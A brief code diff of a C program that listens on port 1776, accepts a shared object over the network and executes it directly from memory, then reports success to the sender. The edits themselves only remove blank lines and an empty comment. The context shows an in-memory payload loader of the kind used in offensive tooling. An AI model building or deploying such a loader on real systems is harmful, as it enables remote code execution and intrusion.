@@ -16,8 +16,6 @@
 #define MAX 50000
 #define PORT 1776
 
-
-
 struct SOStruct{
     char *len; //
     char *buffer;
@@ -67,7 +65,6 @@ void upload(int connfd) {
         // exec shared object
         int mem_res = mem_dlexec(sharedobject, buffer_size);
 
-        //
         if (mem_res == 0){
             char *tmpMsg = "Successfully executed shared object!";
             write(connfd, tmpMsg, strlen(tmpMsg));
